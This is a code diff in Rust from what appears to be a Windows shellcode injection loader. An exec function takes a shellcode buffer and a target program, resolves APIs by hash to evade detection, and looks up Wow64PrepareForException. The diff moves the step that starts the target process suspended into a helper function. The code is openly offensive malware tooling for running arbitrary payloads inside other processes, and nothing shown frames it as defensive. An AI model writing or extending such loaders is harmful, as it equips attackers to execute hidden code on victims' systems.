@@ -1,7 +1,6 @@
 use std::ffi::c_void;
-use windows_sys::Win32::System::Threading::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED};
+use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};
 use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
-use windows_sys::Win32::Foundation::GetLastError;
 use crate::syscall::common::env::get_loaded_module_by_hash;
 use crate::syscall::common::pe::get_export_by_hash;
 
@@ -26,28 +25,7 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     #[cfg(feature = "debug")]
     crate::utils::print_message(&format!("Wow64PrepareForException pointer: {:p}", wow64_prepare_for_exception));
 
-    let mut startup_info: STARTUPINFOA = std::mem::zeroed();
-    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
-    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
-
-    let app_name = std::ffi::CString::new(target_program).unwrap();
-    let success = CreateProcessA(
-        std::ptr::null(),
-        app_name.as_ptr() as *mut u8,
-        std::ptr::null(),
-        std::ptr::null(),
-        0,
-        CREATE_SUSPENDED,
-        std::ptr::null(),
-        std::ptr::null(),
-        &startup_info,
-        &mut process_info,
-    );
-
-    if success == 0 {
-        let err = GetLastError();
-        return Err(format!("CreateProcessA failed with error: {}", err));
-    }
+    let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
 
     #[cfg(feature = "debug")]
     crate::utils::print_message(&format!("Process created. PID: {}, TID: {}", process_info.dwProcessId, process_info.dwThreadId));
